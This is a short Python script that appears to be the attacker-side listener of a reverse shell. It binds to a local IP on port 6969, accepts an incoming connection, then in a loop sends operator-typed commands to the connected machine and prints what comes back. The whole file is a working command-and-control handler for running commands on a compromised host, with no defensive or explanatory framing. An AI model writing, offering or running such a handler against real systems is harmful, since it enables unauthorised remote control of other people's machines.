#!/usr/bin/python
import socket


listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.2.42", 6969))
listener.listen(0)
print("\n[+] Waiting for incoming connections")
connection, address = listener.accept()
print("\n[+] Got a connection from" + str(address))

while True:
    command = input(">> ")
    connection.send(command.encode('utf-8'))
    result = connection.recv(1024)
    print(result)
